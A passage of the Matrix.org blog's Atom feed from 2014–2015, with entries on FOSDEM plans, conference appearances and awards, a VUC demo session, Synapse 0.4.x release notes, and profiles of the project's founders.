&lt;p&gt;Thanks to everyone who came to have a chat about Matrix and&#x2F;or help with setting up their own homeserver (or to play with &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=TyIw2AkYpeo&quot;&gt;Sentinel, our mascot&lt;&#x2F;a&gt;) - please do reach out to us via our &lt;a href=&quot;&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot; title=&quot;Matrix HQ room&quot;&gt;Matrix HQ room&lt;&#x2F;a&gt; or IRC (&lt;a href=&quot;irc:&#x2F;&#x2F;irc.freenode.net&#x2F;matrix&quot;&gt;#matrix on freenode&lt;&#x2F;a&gt;) if you have any problems - or want to help us fix our python packaging ;)  Now is a great time to get involved as we are currently landing new APIs and soon will be offering an Application Server API to ease bridging to other services.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Looking forward to FOSDEM!</title>
        <published>2015-01-29T00:00:00+00:00</published>
        <updated>2015-01-29T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/01/29/looking-forward-to-fosdem/" type="text/html"/>
        <id>https://matrix.org/blog/2015/01/29/looking-forward-to-fosdem/</id>
        
        <content type="html">&lt;p&gt;This weekend, Matrix is heading to FOSDEM (Free and Open Source Software Developers&#x27; European Meeting) in Brussels, Belgium. We will be hosting two events: a &lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&#x2F;2015&#x2F;schedule&#x2F;event&#x2F;matrix&#x2F;&quot; title=&quot;lightning talk&quot;&gt;lightning talk&lt;&#x2F;a&gt; on Saturday at 16:30 in room H.2215 (Ferrer), and an &lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&#x2F;2015&#x2F;schedule&#x2F;event&#x2F;deviot04&#x2F;&quot; title=&quot;IoT devroom talk&quot;&gt;IoT devroom talk&lt;&#x2F;a&gt; on Sunday morning at 11:00 in room H.2213.&lt;&#x2F;p&gt;
&lt;p&gt;FOSDEM&#x27;s &lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&#x2F;2015&#x2F;schedule&#x2F;&quot; title=&quot;schedule&quot;&gt;schedule&lt;&#x2F;a&gt; is looking very interesting and varied, and we hope we can learn about interesting projects - and of course show how and where Matrix can be used to lots of FOSDEM-attendees. Please come over and have a chat if you are interested; we have a stand on the second floor in the K building - just take a right after coming up the stairs and say hi! &lt;&#x2F;p&gt;
&lt;p&gt;We have also set up a Matrix &amp;lt;-&amp;gt; IRC bridge on the #fosdem channel on freenode, which means that any conversation happening there will be copied over to &lt;a href=&quot;&#x2F;beta&#x2F;#&#x2F;room&#x2F;#fosdem:matrix.org&quot; title=&quot;#fosdem:matrix.org&quot;&gt;#fosdem:matrix.org&lt;&#x2F;a&gt; - and vice versa. Making bridges to other services is currently being worked on as part of the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;application-services&#x2F;drafts&#x2F;application_services.rst&quot; title=&quot;Application Services API&quot;&gt;Application Services API&lt;&#x2F;a&gt; - we want to be able to connect different services together via Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, we are always available in the official &lt;a href=&quot;&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot; title=&quot;Matrix HQ room&quot;&gt;Matrix HQ room&lt;&#x2F;a&gt; - please join and say hi!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Matrix on the Road #2 - A winning tour!</title>
        <published>2014-11-29T00:00:00+00:00</published>
        <updated>2014-11-29T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2014/11/29/matrix-on-the-road-2-a-winning-tour/" type="text/html"/>
        <id>https://matrix.org/blog/2014/11/29/matrix-on-the-road-2-a-winning-tour/</id>
        
        <content type="html">&lt;p&gt;Some updates on the conferences Matrix attended over the last 3 weeks: WebRTC Summit in Santa Clara, TAD Summit in Istanbul, WebRTC World West in San José and fOSSa in Rennes. Great shows, ending in lots of interesting discussions and new excitement in Matrix!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;webrtc-summit-santa-clara-november-4-6&quot;&gt;WebRTC Summit (Santa Clara, November 4-6)&lt;&#x2F;h2&gt;
&lt;p&gt;Matrix was a &lt;a href=&quot;http:&#x2F;&#x2F;cloudcomputing.sys-con.com&#x2F;node&#x2F;3242708&quot;&gt;sponsor&lt;&#x2F;a&gt; at the Santa Clara &lt;a href=&quot;http:&#x2F;&#x2F;webrtcsummit.net&#x2F;&quot;&gt;WebRTC Summit&lt;&#x2F;a&gt; at CloudExpo, and opened the WebRTC track alongside our friends at &lt;a href=&quot;http:&#x2F;&#x2F;www.openpeer.org&quot;&gt;Open Peer &#x2F; Hookflash&lt;&#x2F;a&gt;. Matthew presented Matrix as the missing signalling layer for WebRTC and as a good federated complement to MQTT and COAP for IoT use cases: you can find his presentation &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2014&#x2F;11&#x2F;2014-11-03-Matrix_Missing-Link_IOT.pdf&quot;&gt;here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Great techie discussions and debates down there, the stand was flooded with interested people and John had a hardtime answering everyone by himself on day 2!&lt;&#x2F;p&gt;
&lt;p&gt;But he still found a few minutes to do a TV interview for SYSCon TV on Tuesday evening! :)&lt;&#x2F;p&gt;
&lt;p&gt;[embed]http:&#x2F;&#x2F;youtu.be&#x2F;JVq6S9V1Jcg[&#x2F;embed]&lt;&#x2F;p&gt;
&lt;h2 id=&quot;tad-summit-istanbul-november-12-13&quot;&gt;TAD Summit (Istanbul, November 12-13)&lt;&#x2F;h2&gt;
&lt;p&gt;Matrix was a partner at &lt;a href=&quot;http:&#x2F;&#x2F;tadsummit.com&#x2F;2014&#x2F;&quot;&gt;TAD Summit&lt;&#x2F;a&gt; in Istanbul this year, a great opportunity to meet a very good mix of developers, industry players and mobile networks! TAD mixes conferences and technical workshops where everyone gets involved to create a vibrant ecosystem for Telecom Application Developers. Again really productive discussions and meetings as we continue our search for partners to help support the uptake of Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;Matthew&#x27;s talk was fully recorded so just watch the video to get the real pitch!&lt;&#x2F;p&gt;
&lt;p&gt;[embed]http:&#x2F;&#x2F;youtu.be&#x2F;ER3g4-4bFYk?list=PLO-gJ4-4x_IIYVTuLmVr8iUedvVdduYY4[&#x2F;embed]&lt;&#x2F;p&gt;
&lt;p&gt;[embed]https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=As-5vVdXhu0[&#x2F;embed]&lt;&#x2F;p&gt;
&lt;h2 id=&quot;webrtc-world-san-jose-november-18-20&quot;&gt;WebRTC World (San Jose, November 18-20)&lt;&#x2F;h2&gt;
&lt;p&gt;Matrix&#x27;s attendance at &lt;a href=&quot;http:&#x2F;&#x2F;www.webrtcworld.com&#x2F;conference&#x2F;west&#x2F;default.aspx&quot;&gt;WebRTC World&lt;&#x2F;a&gt; in San Jose was more rewarding than expected! The team was ready to be part of the expo and give a talk on FOSS WebRTC options... but didn&#x27;t hesitate to jump at the opportunity when a demo slot opened up! And that was a worthwhile decision as Matrix ended up winning not one but&lt;strong&gt; TWO awards from the demo:&lt;&#x2F;strong&gt; The &lt;span style=&quot;color: #0000ff;&quot;&gt;&lt;strong&gt;Audience Choice Award&lt;&#x2F;strong&gt;&lt;&#x2F;span&gt;
as the audience&#x27;s favourite demo of the 10 shown on Tuesday, and also the overall &lt;span style=&quot;color: #0000ff;&quot;&gt;&lt;strong&gt;Best Social Integration Award&lt;&#x2F;strong&gt; &lt;&#x2F;span&gt;
from the Jury! So a big congrats to the dev team who were rushing to get the fine details ready in time and to Matthew for getting the audience&#x27;s attention! And of course a even bigger thank you to everyone who voted for us, including in the Jury!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2014&#x2F;11&#x2F;sj.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-medium wp-image-239&quot; src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2014&#x2F;11&#x2F;sj-300x168.jpg&quot; alt=&quot;Matthew at WebRTC World 2014&quot; width=&quot;300&quot; height=&quot;168&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Of course this drew lots of interest, and WebRTC Expo ended up the busiest show ever for the team who pitched solidly at the booth for 2 days in a row!&lt;&#x2F;p&gt;
&lt;div style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2014&#x2F;11&#x2F;Audience_Choice_14.png&quot;&gt;&lt;img class=&quot;size-full wp-image-240&quot; style=&quot;box-shadow: none ! important;&quot; src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2014&#x2F;11&#x2F;Audience_Choice_14.png&quot; alt=&quot;Audience_Choice_14&quot; width=&quot;300&quot; height=&quot;229&quot; &#x2F;&gt;&lt;&#x2F;a&gt; &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2014&#x2F;11&#x2F;Best_Social_Integration_14.png&quot;&gt;&lt;img class=&quot;size-medium wp-image-241&quot; style=&quot;box-shadow: none ! important;&quot; src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2014&#x2F;11&#x2F;Best_Social_Integration_14.png&quot; alt=&quot;Best_Social_Integration_14&quot; width=&quot;300&quot; height=&quot;229&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;div&gt;
&lt;h2 id=&quot;fossa-rennes-november-20&quot;&gt;fOSSa (Rennes, November 20)&lt;&#x2F;h2&gt;
&lt;p&gt;And eventually, while Matthew and John were celebrating in San José (or flying home, more accurately), Amandine was also evangelising at home in Rennes (France), where &lt;a href=&quot;https:&#x2F;&#x2F;fossa.inria.fr&#x2F;&quot;&gt;fOSSa &lt;&#x2F;a&gt;was gathering experts from the opensource world for 3 days. Matrix was presented within the Serendipity section on the conférence, &amp;quot;Le Carrefour des Possibles&amp;quot;: 6 minutes to pitch an open project that making dreams possible.&lt;&#x2F;p&gt;
&lt;p&gt;So if you speak French or are not afraid to only read from &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2014&#x2F;11&#x2F;2014-11-17.2-Matrix.pdf&quot;&gt;the slides&lt;&#x2F;a&gt;, check out the video the team made of the pitch. The official one should be available soon!&lt;&#x2F;p&gt;
&lt;p&gt;[embed]http:&#x2F;&#x2F;youtu.be&#x2F;DyL9Ue0KlBU[&#x2F;embed]&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Don&#x27;t miss Matrix in tonight&#x27;s #vuc session!</title>
        <published>2014-11-28T00:00:00+00:00</published>
        <updated>2014-11-28T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2014/11/28/don-t-miss-matrix-in-tonight-s-vuc-session/" type="text/html"/>
        <id>https://matrix.org/blog/2014/11/28/don-t-miss-matrix-in-tonight-s-vuc-session/</id>
        
        <content type="html">&lt;p&gt;Crazy session tonight at 5pm UK time (12 Noon Eastern Time; 9AM Pacific) on &lt;a href=&quot;http:&#x2F;&#x2F;www.voipusersconference.org&#x2F;&quot;&gt;VUC&lt;&#x2F;a&gt; as &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&quot;&gt;Matrix&lt;&#x2F;a&gt;, &lt;a href=&quot;truphone.com&quot;&gt;Truphone&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;jitsi.org&#x2F;&quot;&gt;Jitsi&lt;&#x2F;a&gt; were crazy enough to hack a federated demo in 48h!&lt;&#x2F;p&gt;
&lt;p&gt;Join us live for the demo from the inside by using Matrix to attend the conference (see steps below)! No browser supporting WebRTC at hand but still willing to play with Matrix? You can also follow the chatroom (bridged to IRC) by entering &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;beta&#x2F;#&#x2F;room&#x2F;!AonkiegHRhJtwwFMdk:matrix.org&quot;&gt;#vuc:matrix.org&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;For other connection means:&lt;&#x2F;p&gt;
&lt;ul&gt;
	&lt;li&gt;Live video &lt;a href=&quot;http:&#x2F;&#x2F;live.vuc.me&#x2F;&quot;&gt;http:&#x2F;&#x2F;live.vuc.me&lt;&#x2F;a&gt; or &lt;a href=&quot;http:&#x2F;&#x2F;vuc.me&quot;&gt;http:&#x2F;&#x2F;vuc.me&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
	&lt;li&gt;Live audio: &lt;a href=&quot;http:&#x2F;&#x2F;vuc.audio&#x2F;&quot;&gt;http:&#x2F;&#x2F;vuc.audio&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
	&lt;li&gt;sip:200901@login.zipdx.com&lt;&#x2F;li&gt;
	&lt;li&gt;&lt;a href=&quot;skype:vuc.me?Call&quot;&gt;Skype:vuc.me&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
	&lt;li&gt;Or from a regular telephone or cell call ZipDX (+1 (646) 475-2098) or see the &lt;a title=&quot;List of International numbers from Voxbone&quot; href=&quot;http:&#x2F;&#x2F;vuc.li&#x2F;VoxboneVUC&quot;&gt;Voxbone International Dial-in List&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;em&gt;&lt;strong&gt;Steps to join the call from Matrix:&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;
&lt;ol&gt;
	&lt;li&gt;Register on &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;beta&quot;&gt;Matrix&lt;&#x2F;a&gt; from Chrome if not already done :)&lt;&#x2F;li&gt;
	&lt;li&gt;Start a chat with @vucbot:matrix.org by entering the ID in the appropriate textfield at the bottom of the public rooms list on &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;beta&quot;&gt;http:&#x2F;&#x2F;matrix.org&#x2F;beta&lt;&#x2F;a&gt; and click on &quot;Message User&quot;&lt;&#x2F;li&gt;
	&lt;li&gt;In the chat room start a voice call by clicking on the mic icon in the top right corner. Don&#x27;t forget to allow your browser to access your mic and speakerphones!&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2014&#x2F;11&#x2F;vuc.png&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-231&quot; src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2014&#x2F;11&#x2F;vuc.png&quot; alt=&quot;vuc&quot; width=&quot;144&quot; height=&quot;172&quot; &#x2F;&gt;&lt;&#x2F;a&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse 0.4.2 released!</title>
        <published>2014-10-31T00:00:00+00:00</published>
        <updated>2014-10-31T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2014/10/31/synapse-0-4-2-released/" type="text/html"/>
        <id>https://matrix.org/blog/2014/10/31/synapse-0-4-2-released/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;There&#x27;s been loads of work going on in various branches on Synapse (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;tree&#x2F;federation_authorization&quot;&gt;federation_authorization&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;tree&#x2F;event_signing&quot;&gt;event_signing&lt;&#x2F;a&gt;) as we land the final features needed for Synapse to be used in production as a Matrix reference server.  Meanwhile the iOS demo client and SDK has been coming on leaps and bounds too over at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ios-sdk&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ios-sdk&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;However, stuff has also been happening on the main Synapse development branch too, and we&#x27;ve just released 0.4.2 onto master for lots of various goodies - see release notes below.&lt;&#x2F;p&gt;
&lt;p&gt;Please upgrade your homeservers and play with the new client - the new JSON viewing&#x2F;editing features are particularly useful and interesting for powerusers and developers!&lt;&#x2F;p&gt;
&lt;p&gt;Matthew&lt;&#x2F;p&gt;
&lt;pre&gt;
Changes in synapse 0.4.2 (2014-10-31)
=====================================

Homeserver:

 * Fix bugs where we did not notify users of correct presence updates.
 * Fix bug where we did not handle sub second event stream timeouts.

Webclient:

 * Add ability to click on messages to see JSON.
 * Add ability to redact messages.
 * Add ability to view and edit all room state JSON.
 * Handle incoming redactions.
 * Improve feedback on errors.
 * Fix bugs in mobile CSS.
 * Fix bugs with desktop notifications.

&lt;&#x2F;pre&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Alpha builds of native mobile Matrix SDKs available... and Synapse 0.4.1 released!!</title>
        <published>2014-10-18T00:00:00+00:00</published>
        <updated>2014-10-18T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2014/10/18/alpha-builds-of-native-mobile-matrix-sdks-available-and-synapse-0-4-1-released/" type="text/html"/>
        <id>https://matrix.org/blog/2014/10/18/alpha-builds-of-native-mobile-matrix-sdks-available-and-synapse-0-4-1-released/</id>
        
        <content type="html">&lt;p&gt;It&#x27;s been an incredibly busy few weeks in Matrixland - we&#x27;ve had our heads down rushing to get new stuff ready for today&#x27;s &lt;a href=&quot;http:&#x2F;&#x2F;disrupteuhackathon.challengepost.com&quot;&gt;TechCrunch Disrupt London hackathon&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The big news is that we have our first alpha releases of native Mobile SDKs available today for Matrix for iOS &amp;amp; Android! These are entirely new projects - you can check out the SDKs and demo apps (which implement a basic Matrix chatroom client similar to the &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;alpha&quot;&gt;webclient demo&lt;&#x2F;a&gt; at:&lt;&#x2F;p&gt;
&lt;ul&gt;
	&lt;li&gt;&lt;a href=&quot;http:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ios-sdk&quot;&gt;http:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ios-sdk&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
	&lt;li&gt;&lt;a href=&quot;http:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-android-sdk&quot;&gt;http:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-android-sdk&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
We still have a lot of polishing and lipstick to apply to these, but it should be a good starting point for folks who&#x27;d like to hack on mobile apps for Matrix! We haven&#x27;t had a chance to generate appledoc&#x2F;javadoc for these yet, but we&#x27;ll post them on matrix.org shortly.
&lt;p&gt;There&#x27;s also been some work going into restructuring our documentation and finalising the spec - all Matrix generic documentation now lives in a new git project at &lt;a href=&quot;http:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&quot;&gt;http:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&lt;&#x2F;a&gt;. We&#x27;re still working on wrapping all the details of the spec into a single canonical document, but it&#x27;s getting there and should be locked down shortly.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, we&#x27;re also pleased to announce the new Synapse 0.4 release series of the reference Matrix homeserver. Our focus on Synapse over the last few weeks has been on implementing the remaining pieces of the Matrix security model and getting the server to the point where folks can deploy it properly in production environments.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;b&gt;Synapse 0.4 deliberately breaks backwards compatibility on the server-server federation protocol&lt;&#x2F;b&gt;, as we now cryptographically sign all federation traffic at the HTTP layer (using Authorization headers) in order to have a strong assertion to the identity of the servers which exchange traffic. We can&#x27;t really use SSL client&#x2F;server certificates for this as it&#x27;s incompatible with Synapse deployments which are hosted behind generic SSL loadbalancers.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile we have two other major development branches on Synapse which will land shortly - one of which &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;tree&#x2F;event_signing&quot;&gt;cryptographically signs all events&lt;&#x2F;a&gt;, thus preventing tampering with room history, and the other of which performs &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;tree&#x2F;federation_authorization&quot;&gt;strict authorization&lt;&#x2F;a&gt; on all traffic received through federation to avoid malicious events being injected and breaking the consistency of the distributed room. These should be landing shortly - at which point the full security model of Matrix will be implemented in Synapse and we can finally remove the &amp;quot;don&#x27;t use this in production!&amp;quot; warnings!&lt;&#x2F;p&gt;
&lt;p&gt;API developers: be aware that this release also fixes the confusion over timestamps in the client-server (and server-server) API. Events now have only one well-defined timestamp - event.origin_server_ts; the localtime on the homeserver which first receives a message. This replaces the previous confusing event.ts and event.content.hsob_ts timestamps. This should be a trivial change to implement.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, we&#x27;ve also had a detour into &lt;a href=&quot;http:&#x2F;&#x2F;trossenrobotics.com&#x2F;phantomx-ax-hexapod.aspx&quot;&gt;robotics&lt;&#x2F;a&gt; to build our new mascot (Sentinel)... pictures forthcoming shortly!&lt;&#x2F;p&gt;
&lt;p&gt;Thanks for supporting Matrix - please let us know how you get on with the new releases at &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;alpha&quot;&gt;#matrix:matrix.org!&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;code&gt;
Changes in synapse 0.4.1 (2014-10-17)
=====================================
Webclient:
&lt;ul&gt;
&lt;li&gt;Fix bug with display of timestamps.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;changes-in-synpase-0-4-0-2014-10-17&quot;&gt;Changes in synpase 0.4.0 (2014-10-17)&lt;&#x2F;h1&gt;
&lt;p&gt;This release includes changes to the federation protocol and client-server API
that is not backwards compatible.&lt;&#x2F;p&gt;
&lt;p&gt;The Matrix specification has been moved to a separate git repository:
http:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&lt;&#x2F;p&gt;
&lt;p&gt;You will also need an updated syutil and config. See UPGRADES.rst.&lt;&#x2F;p&gt;
&lt;p&gt;Homeserver:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Sign federation transactions to assert strong identity over federation.&lt;&#x2F;li&gt;
&lt;li&gt;Rename timestamp keys in PDUs and events from &#x27;ts&#x27; and &#x27;hsob_ts&#x27; to &#x27;origin_server_ts&#x27;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;code&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Who is Matrix.org?</title>
        <published>2014-10-16T00:00:00+00:00</published>
        <updated>2014-10-16T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2014/10/16/who-is-matrix-org/" type="text/html"/>
        <id>https://matrix.org/blog/2014/10/16/who-is-matrix-org/</id>
        
        <content type="html">&lt;p&gt;Matrix.org is a team of around 10 developers working together on the Matrix project, defining the Matrix open standard and developing the opensource reference client and server implementations.  Most of the team has day jobs at &lt;a href=&quot;http:&#x2F;&#x2F;amdocs.com&quot;&gt;Amdocs&lt;&#x2F;a&gt; or &lt;a href=&quot;http:&#x2F;&#x2F;www.openmarket.com&quot;&gt;OpenMarket&lt;&#x2F;a&gt; (who kindly sponsor us to work on Matrix), and we gladly welcome contributors from the wider open source community.&lt;&#x2F;p&gt;
&lt;p&gt;Matrix was started by Matthew Hodgson and Amandine Le Pape whilst building Amdocs Unified Communications, on realising that traditional VoIP and IM standards were insufficient to power featureful apps which can openly federate with one another.  Matrix is designed to support open federation for the current and future state-of-the-art in communication apps using a simple web-friendly HTTP API standard.  Our dream is to break down the walls between today&#x27;s communication silos, and make VoIP and IM as ubiquitous and open as email.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;matthew&quot;&gt;Matthew&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2014&#x2F;10&#x2F;me.jpg&quot;&gt;&lt;img class=&quot;alignnone size-medium wp-image-162&quot; style=&quot;float: right; margin-left: 1em; margin-bottom: 1em;&quot; src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2014&#x2F;10&#x2F;me-257x300.jpg&quot; alt=&quot;Matthew Hodgson&quot; width=&quot;128&quot; height=&quot;150&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Matthew Hodgson is technical co-founder of matrix.org, responsible for defining Matrix&#x27;s vision with Amandine and moving obstacles out of the way of the team in order to build it.  Matthew has spent the last 15 years mainly designing and building various communication solutions on top of an alarming array of different technologies (IRC, IM, NNTP, IMAP, IAX, SIP&#x2F;RTP, RTMP, XMPP... and now Matrix).&lt;&#x2F;p&gt;
&lt;p&gt;Matthew&#x27;s day job is running the Unified Communications team at Amdocs, creating communication apps for large mobile network operators (e.g. &lt;a href=&quot;http:&#x2F;&#x2F;blah.com&quot;&gt;Blah&lt;&#x2F;a&gt; for TIM Brasil).  Previously he ran &amp;quot;The Next Generation&amp;quot; telephony&#x2F;media team at MX Telecom (acquired by Amdocs in 2010), building a highly distributed SIP softswitch and mobile-optimised WebRTC-compatible graph-based media framework and VoIP stack to power MX&#x27;s voice and video services.  Matthew has also been known to dabble in sysadmin (running MX Telecom&#x27;s sysadmin team), dubious graphic design and CGI, and wishes he had more time to play piano.  He has a degree in Computer Science and Physics from the University of Cambridge, and has previously worked at Accenture, the Rutherford Appleton Laboratory, &lt;a href=&quot;http:&#x2F;&#x2F;www.theonering.net&quot;&gt;TheOneRing.net&lt;&#x2F;a&gt; as well as misguidedly co-founding a digital marketing startup in Bahrain. [&lt;a href=&quot;https:&#x2F;&#x2F;www.linkedin.com&#x2F;profile&#x2F;view?id=6841469&quot;&gt;LinkedIn&lt;&#x2F;a&gt;]&lt;&#x2F;p&gt;
&lt;h2 id=&quot;amandine&quot;&gt;Amandine&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2014&#x2F;10&#x2F;am.jpg&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-163&quot; style=&quot;float: right; margin-left: 1em; margin-bottom: 1em;&quot; src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2014&#x2F;10&#x2F;am.jpg&quot; alt=&quot;Amandine Le Pape&quot; width=&quot;128&quot; height=&quot;150&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Amandine Le Pape is business co-founder of matrix.org, responsible for defining the Matrix vision with Matthew and then organising the non-technical activities required to support and promote it and make it successful.&lt;&#x2F;p&gt;
&lt;p&gt;Amandine has spent the last 2 years setting up and leading the Unified Communications line of business within Amdocs as a Product Manager, and has more than 10 years of experience in mobile services and telecommunications.  She has a degree in telecommunications engineering from Ecole Supérieure de Chimie, Physique et Electronique de Lyon and an EMBA from ESC Rennes. [&lt;a href=&quot;https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;amandineroux&quot;&gt;LinkedIn&lt;&#x2F;a&gt;]&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>High Level Overview</title>
        <published>2014-09-06T00:00:00+00:00</published>
        <updated>2014-09-06T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2014/09/06/high-level-tech-overview/" type="text/html"/>
        <id>https://matrix.org/blog/2014/09/06/high-level-tech-overview/</id>
        
        <content type="html">&lt;p&gt;Hey,&lt;&#x2F;p&gt;
&lt;p&gt;We realized we&#x27;re missing a high level overview highlighting the key points of the specifications and architecture of Matrix, which could be useful for those who don&#x27;t feel like going straight into the specs. So here is a &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2014&#x2F;09&#x2F;Introducing-matrix.pdf&quot;&gt;quick presentation&lt;&#x2F;a&gt; to fill in some of the gaps!&lt;&#x2F;p&gt;
&lt;p&gt;Please fire away with any questions :)&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse v0.2.2 released!</title>
        <published>2014-09-06T00:00:00+00:00</published>
        <updated>2014-09-06T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
